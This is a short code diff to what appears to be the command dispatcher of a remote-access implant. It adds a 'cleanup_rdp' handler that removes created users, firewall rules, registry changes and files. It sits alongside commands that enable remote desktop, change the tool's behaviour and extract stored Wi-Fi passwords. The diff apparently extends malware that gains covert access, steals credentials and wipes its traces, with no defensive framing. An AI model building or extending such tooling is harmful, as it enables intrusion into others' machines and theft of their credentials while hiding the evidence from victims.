@@ -35,7 +35,8 @@ class CommandHandler:
             'enable_rdp': CommandHandler.handle_enable_rdp,
             'disable_rdp': CommandHandler.handle_disable_rdp,
             'adjust_behavior': CommandHandler.handle_adjust_behavior,
-            'get_wifi_passwords': CommandHandler.handle_wifi_passwords  # New command
+            'get_wifi_passwords': CommandHandler.handle_wifi_passwords,  # New command
+            'cleanup_rdp': CommandHandler.handle_cleanup_rdp  # New command
         }
         
         handler = handlers.get(command_type)
@@ -45,6 +46,26 @@ class CommandHandler:
             raise CommandError(f"Unknown command type: {command_type}")
         
         return handler(params)
+    
+    @staticmethod
+    def handle_cleanup_rdp(params):
+        """
+        Clean up all RDP-related changes, including users, firewall rules, registry settings,
+        services, and temporary files.
+        """
+        try:
+            rdp_controller = RDPController(EncryptionManager(Config.ENCRYPTION_KEY))
+            result = rdp_controller.cleanup_rdp()
+            if result["status"] == "success":
+                logging.info("RDP cleanup completed successfully")
+                return result
+            else:
+                logging.error(f"Failed to clean up RDP: {result['message']}")
+                raise CommandError(f"Failed to clean up RDP: {result['message']}")
+        except Exception as e:
+            logging.error(f"Cleanup RDP error: {str(e)}")
+            raise CommandError(f"Cleanup RDP error: {str(e)}")
+
     
     @staticmethod
     def handle_wifi_passwords(params: dict) -> dict:
